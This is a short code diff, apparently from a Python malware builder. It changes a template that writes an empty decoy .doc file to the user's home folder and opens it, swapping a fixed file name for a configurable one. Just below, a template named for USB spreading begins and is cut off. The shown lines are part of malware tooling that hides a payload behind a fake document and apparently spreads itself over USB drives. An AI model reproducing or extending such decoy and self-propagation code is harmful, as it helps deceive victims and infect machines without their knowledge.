@@ -134,8 +134,8 @@ elif __filename__ in sys.argv[0]:
 open_fake_file = r'''
     if not os.path.exists(os.path.join(os.path.expanduser('~'), DestDirName)):
         os.mkdir(os.path.join(os.path.expanduser('~'), DestDirName))
-    open(os.path.join(os.path.expanduser('~'), DestDirName, 'temp0829380013_134.doc'), 'w').write('')
-    os.startfile(os.path.join(os.path.expanduser('~'), DestDirName, 'temp0829380013_134.doc'))
+    open(os.path.join(os.path.expanduser('~'), DestDirName, fake_file_name), 'w').write('')
+    os.startfile(os.path.join(os.path.expanduser('~'), DestDirName, fake_file_name))
 '''
 
 usb_spreading_on = r'''
